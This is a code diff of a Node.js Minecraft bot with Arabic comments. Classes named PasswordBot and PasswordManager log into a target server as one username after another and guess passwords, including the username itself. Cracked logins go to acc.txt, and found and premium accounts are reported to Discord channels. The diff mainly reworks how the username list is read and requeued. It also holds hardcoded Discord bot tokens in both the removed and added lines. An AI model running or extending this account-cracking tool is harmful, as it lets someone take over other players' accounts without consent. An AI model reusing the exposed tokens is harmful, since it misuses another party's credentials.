@@ -4,112 +4,24 @@ const fs = require('fs');
 const path = require('path');
 let globalManager = null;
 
-// قراءة الأسماء من ملف JSON
-// قراءة الأسماء من ملف usernames.json
-function loadUsernamesFromJSON() {
-    try {
-        // البحث عن الملف بالترتيب: usernames.json ثم usernames.txt
-        let filePath = path.join(__dirname, 'usernames.json');
-        let isJsonFile = true;
+const USERNAMES = fs.readFileSync(path.join(__dirname, 'usernames.txt'), 'utf8')
+    .split('\n').map(l => l.trim()).filter(Boolean);
 
-        if (!fs.existsSync(filePath)) {
-            filePath = path.join(__dirname, 'usernames.txt');
-            isJsonFile = false;
-
-            if (!fs.existsSync(filePath)) {
-                console.error('❌ Neither usernames.json nor usernames.txt file found!');
-                process.exit(1);
-            }
-        }
-
-        console.log(`📁 Reading from: ${path.basename(filePath)}`);
-        const fileContent = fs.readFileSync(filePath, 'utf8').trim();
-
-        if (!fileContent) {
-            console.error(`❌ ${path.basename(filePath)} is empty!`);
-            process.exit(1);
-        }
-
-        const usernames = [];
-
-        if (isJsonFile) {
-            // قراءة ملف JSON عادي
-            try {
-                const jsonData = JSON.parse(fileContent);
-
-                if (Array.isArray(jsonData)) {
-
-                    for (let i = 0; i < jsonData.length; i++) {
-                        const userData = jsonData[i];
-
-                        if (userData && userData.name && typeof userData.name === 'string') {
-                            usernames.push(userData.name);
-                        } else {
-                            console.warn(`⚠️ Array index ${i}: Missing or invalid 'name' field`);
-                        }
-                    }
-                } else if (jsonData.name) {
-                    // JSON object واحد
-                    usernames.push(jsonData.name);
-                    console.log(`✅ Loaded username: ${jsonData.name} (Rank: ${jsonData.rank || 'N/A'}, Guild: ${jsonData.guild || 'N/A'})`);
-                } else {
-                    console.error('❌ Invalid JSON structure! Expected array or object with "name" field');
-                    process.exit(1);
-                }
-
-            } catch (jsonError) {
-                console.error(`❌ Invalid JSON format: ${jsonError.message}`);
-                process.exit(1);
-            }
-        } else {
-            // قراءة ملف txt (line-by-line JSON)
-            const lines = fileContent.split('\n').map(line => line.trim()).filter(line => line.length > 0);
-
-            for (let i = 0; i < lines.length; i++) {
-                const line = lines[i];
-
-                try {
-                    const userData = JSON.parse(line);
-
-                    if (userData.name && typeof userData.name === 'string') {
-                        usernames.push(userData.name);
-                        console.log(`✅ Loaded username: ${userData.name} (Rank: ${userData.rank || 'N/A'}, Guild: ${userData.guild || 'N/A'})`);
-                    } else {
-                        console.warn(`⚠️ Line ${i + 1}: Missing or invalid 'name' field`);
-                    }
-                } catch (jsonError) {
-                    console.warn(`⚠️ Line ${i + 1}: Invalid JSON format - ${jsonError.message}`);
-                    console.warn(`   Content: ${line.substring(0, 50)}${line.length > 50 ? '...' : ''}`);
-                }
-            }
-        }
-
-        if (usernames.length === 0) {
-            console.error('❌ No valid usernames found!');
-            process.exit(1);
-        }
-
-        console.log(`📦 Successfully loaded ${usernames.length} usernames`);
-        return usernames;
-
-    } catch (error) {
-        console.error(`❌ Error loading usernames: ${error.message}`);
-        process.exit(1);
-    }
+if (USERNAMES.length === 0) {
+    console.error('❌ usernames.txt فارغ!');
+    process.exit(1);
 }
-
-const USERNAMES = loadUsernamesFromJSON();
 
 // إعدادات Discord Bot
 const DISCORD_CONFIG = {
-    token: 'MTM5ODI5ODg5NjEyNzYyNzM4Ng.G57Zby.F2oUiP7hcuEDt1dUxYcs3fMAP0HNq5gMOq9AdA', // ضع توكن البوت هنا
+    token: 'MTM5NTczMjQ0MDQzNzM1ODY3NQ.GB55J8.RnuYGjud2uuks4oOEVSwLi0Q-4vmfplvq8jTVI', // ضع توكن البوت هنا
     enabled: true, // تغيير إلى false لتعطيل Discord
     channels: {
-        success: '1398310301241184256', // ID قناة الحسابات المكتشفة
+        success: '1395737643022553188', // ID قناة الحسابات المكتشفة
         premium: '1395362104910942280', // ID قناة الحسابات المميزة
         banned: '1395362126209482912', // ID قناة الحسابات المحظورة
         general: '1395362151971029113', // ID قناة الإشعارات العامة
-        logs: '1398310359097671821' // ID قناة السجلات
+        logs: '1395362182715408516' // ID قناة السجلات
     }
 };
 
@@ -124,75 +36,24 @@ const BASE_CONFIG = {
     retryInterval: 10000
 };
 
-// دالة محدثة لحذف الاسم من الملف (مع دعم JSON)
-// دالة محدثة لحذف الاسم من الملف
 function removeUsernameFromFile(username) {
     try {
-        // البحث عن الملف المستخدم
-        let filePath = path.join(__dirname, 'usernames.json');
-        let isJsonFile = true;
-
-        if (!fs.existsSync(filePath)) {
-            filePath = path.join(__dirname, 'usernames.txt');
-            isJsonFile = false;
-
-            if (!fs.existsSync(filePath)) {
-                console.error('❌ No usernames file found for removal!');
-                return false;
-            }
-        }
-
-        const currentContent = fs.readFileSync(filePath, 'utf8').trim();
-
-        if (isJsonFile) {
-            // التعامل مع ملف JSON
-            try {
-                const jsonData = JSON.parse(currentContent);
-
-                if (Array.isArray(jsonData)) {
-                    // تصفية المصفوفة لإزالة الاسم المطلوب
-                    const updatedArray = jsonData.filter(item => {
-                        return !(item && item.name === username);
-                    });
-
-                    // إعادة كتابة الملف بتنسيق JSON جميل
-                    fs.writeFileSync(filePath, JSON.stringify(updatedArray, null, 2));
-
-                    console.log(`🗑️ Removed ${username} from ${path.basename(filePath)}`);
-                    console.log(`📊 Remaining entries: ${updatedArray.length}`);
-
-                    return true;
-                } else {
-                    console.error('❌ JSON file is not an array!');
-                    return false;
-                }
-
-            } catch (jsonError) {
-                console.error(`❌ Invalid JSON in file: ${jsonError.message}`);
-                return false;
-            }
-        } else {
-            // التعامل مع ملف txt (line-by-line)
-            const lines = currentContent.split('\n').map(line => line.trim()).filter(line => line.length > 0);
-
-            const updatedLines = lines.filter(line => {
-                try {
-                    const userData = JSON.parse(line);
-                    return userData.name !== username;
-                } catch (error) {
-                    console.warn(`🗑️ Removing invalid JSON line: ${line.substring(0, 30)}...`);
-                    return false;
-                }
-            });
-
-            fs.writeFileSync(filePath, updatedLines.join('\n') + (updatedLines.length > 0 ? '\n' : ''));
-
-            console.log(`🗑️ Removed ${username} from ${path.basename(filePath)}`);
-            console.log(`📊 Remaining entries: ${updatedLines.length}`);
-
-            return true;
-        }
-
+        const filePath = path.join(__dirname, 'usernames.txt');
+        
+        // قراءة محتوى الملف الحالي
+        const currentContent = fs.readFileSync(filePath, 'utf8');
+        
+        // تقسيم الأسطر وإزالة اليوزرنيم المطلوب
+        const lines = currentContent.split('\n');
+        const updatedLines = lines.filter(line => line.trim() !== username && line.trim() !== '');
+        
+        // إعادة كتابة الملف بدون اليوزرنيم المحذوف
+        fs.writeFileSync(filePath, updatedLines.join('\n') + (updatedLines.length > 0 ? '\n' : ''));
+        
+        console.log(`🗑️ Removed ${username} from usernames.txt`);
+        console.log(`📊 Remaining usernames: ${updatedLines.length}`);
+        
+        return true;
     } catch (error) {
         console.error(`❌ Failed to remove username from file: ${error.message}`);
         return false;
@@ -200,126 +61,6 @@ function removeUsernameFromFile(username) {
 }
 
 
-// دالة محدثة لإضافة الاسم إلى نهاية الملف (مع دعم JSON)
-function addUsernameToEndOfFile(username) {
-    try {
-        // البحث عن الملف المستخدم
-        let filePath = path.join(__dirname, 'usernames.json');
-        let isJsonFile = true;
-
-        if (!fs.existsSync(filePath)) {
-            filePath = path.join(__dirname, 'usernames.txt');
-            isJsonFile = false;
-
-            if (!fs.existsSync(filePath)) {
-                console.error('❌ No usernames file found for adding!');
-                return false;
-            }
-        }
-
-        const newUserData = {
-            "name": username,
-            "rank": "Unknown",
-            "guild": "",
-            "firstSeen": Date.now(),
-            "lastSeen": Date.now(),
-            "requeued": true
-        };
-
-        if (isJsonFile) {
-            // التعامل مع ملف JSON
-            try {
-                const currentContent = fs.readFileSync(filePath, 'utf8').trim();
-                const jsonData = JSON.parse(currentContent);
-
-                if (Array.isArray(jsonData)) {
-                    jsonData.push(newUserData);
-                    fs.writeFileSync(filePath, JSON.stringify(jsonData, null, 2));
-
-                    console.log(`🔄 Added ${username} to end of ${path.basename(filePath)}`);
-                    return true;
-                } else {
-                    console.error('❌ JSON file is not an array!');
-                    return false;
-                }
-
-            } catch (jsonError) {
-                console.error(`❌ Invalid JSON in file: ${jsonError.message}`);
-                return false;
-            }
-        } else {
-            // التعامل مع ملف txt
-            fs.appendFileSync(filePath, JSON.stringify(newUserData) + '\n');
-            console.log(`🔄 Added ${username} to end of ${path.basename(filePath)}`);
-            return true;
-        }
-
-    } catch (error) {
-        console.error(`❌ Failed to add username to end of file: ${error.message}`);
-        return false;
-    }
-}
-
-
-// دالة محدثة لإعادة تحميل الأسماء من الملف
-// دالة محدثة لإعادة تحميل الأسماء من الملف
-function reloadUsernamesFromFile() {
-    try {
-        let filePath = path.join(__dirname, 'usernames.json');
-        let isJsonFile = true;
-
-        if (!fs.existsSync(filePath)) {
-            filePath = path.join(__dirname, 'usernames.txt');
-            isJsonFile = false;
-
-            if (!fs.existsSync(filePath)) {
-                return [];
-            }
-        }
-
-        const fileContent = fs.readFileSync(filePath, 'utf8').trim();
-
-        if (!fileContent) {
-            return [];
-        }
-
-        const usernames = [];
-
-        if (isJsonFile) {
-            try {
-                const jsonData = JSON.parse(fileContent);
-
-                if (Array.isArray(jsonData)) {
-                    for (const item of jsonData) {
-                        if (item && item.name && typeof item.name === 'string') {
-                            usernames.push(item.name);
-                        }
-                    }
-                }
-            } catch (jsonError) {
-                console.error(`❌ Error parsing JSON file: ${jsonError.message}`);
-            }
-        } else {
-            const lines = fileContent.split('\n').map(line => line.trim()).filter(line => line.length > 0);
-
-            for (const line of lines) {
-                try {
-                    const userData = JSON.parse(line);
-                    if (userData.name && typeof userData.name === 'string') {
-                        usernames.push(userData.name);
-                    }
-                } catch (error) {
-                    continue;
-                }
-            }
-        }
-
-        return usernames;
-    } catch (error) {
-        console.error(`❌ Failed to reload usernames: ${error.message}`);
-        return [];
-    }
-}
 // إعداد Discord Bot
 let discordBot = null;
 
@@ -348,12 +89,13 @@ async function initDiscordBot() {
             fields: [
                 { name: '📊 Total Usernames', value: `${USERNAMES.length}`, inline: true },
                 { name: '🎯 Target Server', value: BASE_CONFIG.host, inline: true },
-                { name: '⏰ Started At', value: new Date().toLocaleString(), inline: true },
+                { name: '⏰ Started At', value: new Date().toLocaleString(), inline: true }
             ]
         });
     });
 
     // إضافة معالج الأوامر
+    // إضافة معالج الأوامر (تحديث الجزء الموجود)
     discordBot.on('messageCreate', async (message) => {
         if (message.author.bot) return;
 
@@ -364,7 +106,7 @@ async function initDiscordBot() {
         }
     });
 
-    // دالة معالجة أمر !acc
+    // دالة معالجة أمر !acc الجديدة
     async function handleAccCommand(message) {
         try {
             const accFilePath = path.join(__dirname, 'acc.txt');
@@ -467,6 +209,7 @@ async function handleStatsCommand(message) {
     const manager = globalManager;
     const bot = manager.bot;
     const totalTime = manager.startTime ? Date.now() - manager.startTime : 0;
+    const currentTime = Date.now();
 
     // حساب الإحصائيات
     const currentUsernameIndex = manager.index + 1;
@@ -651,6 +394,10 @@ async function sendToDiscord(channelType, embedData) {
     }
 }
 
+
+
+
+
 class PasswordBot {
     constructor(username, manager) {
         this.manager = manager;
@@ -675,7 +422,7 @@ class PasswordBot {
         // متغيرات لتجربة اليوزر نيم ككلمة مرور
         this.triedUsernameAsPassword1 = false;
         this.triedUsernameAsPassword2 = false;
-        this.triedCleanUsername = false;
+        this.triedCleanUsername = false; // إضافة متغير جديد للاسم المنظف
 
         // متغيرات حساب زمن الاستجابة
         this.lastAttemptTime = null;
@@ -760,9 +507,6 @@ class PasswordBot {
             fs.appendFileSync(premiumFile, this.CONFIG.username + '\n');
             console.log(`💎 Premium name saved to premnames.txt: ${this.CONFIG.username}`);
 
-            // زيادة عداد الحسابات المميزة
-            this.manager.premiumCount++;
-
             // إرسال إشعار Discord للحساب المميز
             await sendToDiscord('premium', {
                 title: '💎 Premium Account Detected!',
@@ -782,7 +526,25 @@ class PasswordBot {
         }
     }
 
+
+    addUsernameToEndOfFile(username) {
+    try {
+        const filePath = path.join(__dirname, 'usernames.txt');
+        
+        // إضافة الاسم لآخر الملف
+        fs.appendFileSync(filePath, username + '\n');
+        
+        console.log(`🔄 Added ${username} to end of usernames.txt`);
+        
+        return true;
+    } catch (error) {
+        console.error(`❌ Failed to add username to end of file: ${error.message}`);
+        return false;
+    }
+}
+
     createBot() {
+
         this.bot = mineflayer.createBot(this.CONFIG);
         this.isActive = false;
 
@@ -819,6 +581,7 @@ class PasswordBot {
                 this.handleRegistrationRequired();
                 return;
             }
+
 
             if (message.includes('/login <password>') || message.includes('If you lost the password')) {
                 this.handleServerResponse();
@@ -1070,6 +833,36 @@ class PasswordBot {
         this.finishUsername();
     }
 
+    // تحديث savePremiumName
+    async savePremiumName() {
+        try {
+            const premiumFile = path.join(__dirname, 'premnames.txt');
+            fs.appendFileSync(premiumFile, this.CONFIG.username + '\n');
+            console.log(`💎 Premium name saved to premnames.txt: ${this.CONFIG.username}`);
+
+            // زيادة عداد الحسابات المميزة
+            this.manager.premiumCount++;
+
+            // إرسال إشعار Discord للحساب المميز
+            await sendToDiscord('premium', {
+                title: '💎 Premium Account Detected!',
+                description: `A premium Minecraft account has been detected and saved.`,
+                color: 0xffd700,
+                fields: [
+                    { name: '👤 Username', value: this.CONFIG.username, inline: true },
+                    { name: '🎯 Server', value: this.CONFIG.host, inline: true },
+                    { name: '⏰ Detected At', value: new Date().toLocaleString(), inline: true },
+                    { name: '💎 Account Type', value: 'Premium Account', inline: true },
+                    { name: '📁 Saved To', value: 'premnames.txt', inline: true }
+                ],
+                thumbnail: 'https://i.imgur.com/premium_icon.png'
+            });
+        } catch (error) {
+            console.error(`❌ Failed to save premium name: ${error.message}`);
+        }
+    }
+
+    // تحديث handleKick لزيادة عداد الحظر
     async handleKick(reason) {
         const txt = reason.toString();
 
@@ -1082,36 +875,37 @@ class PasswordBot {
             return;
         }
 
-        if (txt.includes('You are already logged on')) {
-            console.log('ℹ️ Already logged in - moving to end of queue.');
 
-            // مسح الاسم من مكانه الحالي أولاً
-            removeUsernameFromFile(this.CONFIG.username);
+if (txt.includes('You are already logged on')) {
+    console.log('ℹ️ Already logged in - moving to end of queue.');
 
-            // ثم إضافة الاسم لآخر قائمة الأسماء
-            addUsernameToEndOfFile(this.CONFIG.username);
+    // مسح الاسم من مكانه الحالي أولاً
+    removeUsernameFromFile(this.CONFIG.username);
+    
+    // ثم إضافة الاسم لآخر قائمة الأسماء
+    this.addUsernameToEndOfFile(this.CONFIG.username);
 
-            await sendToDiscord('logs', {
-                title: '🔄 Already Logged In - Re-queued',
-                description: `Username **${this.CONFIG.username}** is already logged into the server and has been moved to end of queue.`,
-                color: 0xffff00,
-                fields: [
-                    { name: '👤 Username', value: this.CONFIG.username, inline: true },
-                    { name: '📁 Status', value: 'Moved to end of queue', inline: true },
-                    { name: '⏰ Time', value: new Date().toLocaleString(), inline: true }
-                ]
-            });
+    await sendToDiscord('logs', {
+        title: '🔄 Already Logged In - Re-queued',
+        description: `Username **${this.CONFIG.username}** is already logged into the server and has been moved to end of queue.`,
+        color: 0xffff00,
+        fields: [
+            { name: '👤 Username', value: this.CONFIG.username, inline: true },
+            { name: '📁 Status', value: 'Moved to end of queue', inline: true },
+            { name: '⏰ Time', value: new Date().toLocaleString(), inline: true }
+        ]
+    });
 
-            this.isFinished = true;
+    this.isFinished = true;
+    
+    // هنا مش هنعمل finishUsername عشان مش عايزين نمسحه تاني
+    this.cleanup();
 
-            // هنا مش هنعمل finishUsername عشان مش عايزين نمسحه تاني
-            this.cleanup();
-
-            setTimeout(() => {
-                this.manager.nextUsername();
-            }, 1000);
-            return;
-        }
+    setTimeout(() => {
+        this.manager.nextUsername();
+    }, 1000);
+    return;
+}
 
         if (txt.includes('You are banned from')) {
             console.log('⛔ Account is banned - skipping to next username');
@@ -1140,6 +934,7 @@ class PasswordBot {
 
         console.log('ℹ️ Disconnected - will reconnect');
     }
+
 
     scheduleReconnect() {
         if (this.isSuccess || this.isFinished) {
@@ -1198,51 +993,53 @@ class PasswordBot {
     }
 
     async handleRegistrationRequired() {
-        console.log('📝 This account requires registration - skipping to next username');
+    console.log('📝 This account requires registration - skipping to next username');
+    
+    await sendToDiscord('logs', {
+        title: '📝 Registration Required',
+        description: `Username **${this.CONFIG.username}** requires registration and will be skipped.`,
+        color: 0xffa500,
+        fields: [
+            { name: '👤 Username', value: this.CONFIG.username, inline: true },
+            { name: '🎯 Server', value: this.CONFIG.host, inline: true },
+            { name: '📁 Status', value: 'Requires Registration', inline: true },
+            { name: '⏰ Skipped At', value: new Date().toLocaleString(), inline: true },
+            { name: '📝 Action Taken', value: 'Moved to next username', inline: true }
+        ]
+    });
 
-        await sendToDiscord('logs', {
-            title: '📝 Registration Required',
-            description: `Username **${this.CONFIG.username}** requires registration and will be skipped.`,
-            color: 0xffa500,
-            fields: [
-                { name: '👤 Username', value: this.CONFIG.username, inline: true },
-                { name: '🎯 Server', value: this.CONFIG.host, inline: true },
-                { name: '📁 Status', value: 'Requires Registration', inline: true },
-                { name: '⏰ Skipped At', value: new Date().toLocaleString(), inline: true },
-                { name: '📝 Action Taken', value: 'Moved to next username', inline: true }
-            ]
-        });
+    this.isFinished = true;
+    this.finishUsername();
+}
 
-        this.isFinished = true;
-        this.finishUsername();
-    }
 
-    async finishUsername() {
-        this.isFinished = true;
-        this.cleanup();
+async finishUsername() {
+    this.isFinished = true;
+    this.cleanup();
 
-        // إرسال إشعار انتهاء اختبار username
-        const totalTime = this.startTime ? Date.now() - this.startTime : 0;
-        await sendToDiscord('logs', {
-            title: '✅ Username Testing Completed',
-            description: `Finished testing username: **${this.CONFIG.username}**`,
-            color: 0x00ff00,
-            fields: [
-                { name: '👤 Username', value: this.CONFIG.username, inline: true },
-                { name: '📊 Passwords Tested', value: `${this.currentIndex + (this.isSuccess ? 1 : 0)}`, inline: true },
-                { name: '⏱️ Total Time', value: this.formatTime(totalTime), inline: true },
-                { name: '🎯 Result', value: this.isSuccess ? 'Success' : 'No match found', inline: true },
-                { name: '⏰ Finished At', value: new Date().toLocaleString(), inline: true }
-            ]
-        });
+    // إرسال إشعار انتهاء اختبار username
+    const totalTime = this.startTime ? Date.now() - this.startTime : 0;
+    await sendToDiscord('logs', {
+        title: '✅ Username Testing Completed',
+        description: `Finished testing username: **${this.CONFIG.username}**`,
+        color: 0x00ff00,
+        fields: [
+            { name: '👤 Username', value: this.CONFIG.username, inline: true },
+            { name: '📊 Passwords Tested', value: `${this.currentIndex + (this.isSuccess ? 1 : 0)}`, inline: true },
+            { name: '⏱️ Total Time', value: this.formatTime(totalTime), inline: true },
+            { name: '🎯 Result', value: this.isSuccess ? 'Success' : 'No match found', inline: true },
+            { name: '⏰ Finished At', value: new Date().toLocaleString(), inline: true }
+        ]
+    });
 
-        // حذف اليوزرنيم من الملف
-        removeUsernameFromFile(this.CONFIG.username);
+    // *** إضافة هذا السطر الجديد لحذف اليوزرنيم من الملف ***
+    removeUsernameFromFile(this.CONFIG.username);
 
-        setTimeout(() => {
-            this.manager.nextUsername();
-        }, 1000);
-    }
+    setTimeout(() => {
+        this.manager.nextUsername();
+    }, 1000);
+}
+
 }
 
 class PasswordManager {
@@ -1259,6 +1056,8 @@ class PasswordManager {
         globalManager = this;
     }
 
+
+    // تحديث دالة start في PasswordManager
     async start() {
         if (this.index >= this.usernames.length) {
             console.log('\n🎉 Finished ALL usernames. Exiting.');
@@ -1293,7 +1092,7 @@ class PasswordManager {
         await this.bot.start();
     }
 
-    // دالة لإرسال ملف acc.txt عند الانتهاء
+    // دالة جديدة لإرسال ملف acc.txt عند الانتهاء
     async sendAccFileOnCompletion() {
         try {
             const accFilePath = path.join(__dirname, 'acc.txt');
@@ -1340,6 +1139,9 @@ class PasswordManager {
             const accountCount = accountLines.length;
 
             console.log(`📤 Sending acc.txt file with ${accountCount} accounts to Discord`);
+
+            // إرسال الملف مع تقرير نهائي
+
 
             // إرسال الملف في رسالة منفصلة
             if (discordBot && DISCORD_CONFIG.channels.general) {
@@ -1390,37 +1192,42 @@ class PasswordManager {
         }
     }
 
-    async nextUsername() {
-        console.log(`\n✅ Finished username: ${this.usernames[this.index]}`);
 
-        // إعادة تحميل قائمة اليوزرنيمز من الملف (في حالة تم حذف بعضها)
-        try {
-            const updatedUsernames = reloadUsernamesFromFile();
-
-            // إذا كانت القائمة فارغة، أنهِ البرنامج
-            if (updatedUsernames.length === 0) {
-                console.log('\n🎉 All usernames have been processed and removed from file. Exiting.');
-
-                await this.sendAccFileOnCompletion();
-                globalManager = null;
-                process.exit(0);
-            }
-
-            // تحديث القائمة المحلية
-            this.usernames = updatedUsernames;
-            this.index = 0; // إعادة تعيين المؤشر للبداية
-
-            console.log(`🔄 Updated usernames list. Remaining: ${this.usernames.length}`);
-
-        } catch (error) {
-            console.error(`❌ Failed to reload usernames: ${error.message}`);
-            this.index++;
+async nextUsername() {
+    console.log(`\n✅ Finished username: ${this.usernames[this.index]}`);
+    
+    // إعادة تحميل قائمة اليوزرنيمز من الملف (في حالة تم حذف بعضها)
+    try {
+        const filePath = path.join(__dirname, 'usernames.txt');
+        const updatedUsernames = fs.readFileSync(filePath, 'utf8')
+            .split('\n').map(l => l.trim()).filter(Boolean);
+        
+        // إذا كانت القائمة فارغة، أنهِ البرنامج
+        if (updatedUsernames.length === 0) {
+            console.log('\n🎉 All usernames have been processed and removed from file. Exiting.');
+            
+            await this.sendAccFileOnCompletion();
+            globalManager = null;
+            process.exit(0);
         }
-
-        setTimeout(async () => {
-            await this.start();
-        }, 2000);
+        
+        // تحديث القائمة المحلية
+        this.usernames = updatedUsernames;
+        this.index = 0; // إعادة تعيين المؤشر للبداية
+        
+        console.log(`🔄 Updated usernames list. Remaining: ${this.usernames.length}`);
+        
+    } catch (error) {
+        console.error(`❌ Failed to reload usernames: ${error.message}`);
+        this.index++;
     }
+
+    setTimeout(async () => {
+        await this.start();
+    }, 2000);
+}
+
+
 
     formatTime(ms) {
         const s = Math.floor(ms / 1000);
@@ -1429,7 +1236,6 @@ class PasswordManager {
         return h ? `${h}h ${m}m ${s % 60}s` : m ? `${m}m ${s % 60}s` : `${s % 60}s`;
     }
 }
-
 // التعامل مع إغلاق البرنامج
 process.on('SIGINT', async () => {
     console.log('\n🛑 Stopping all bots...');
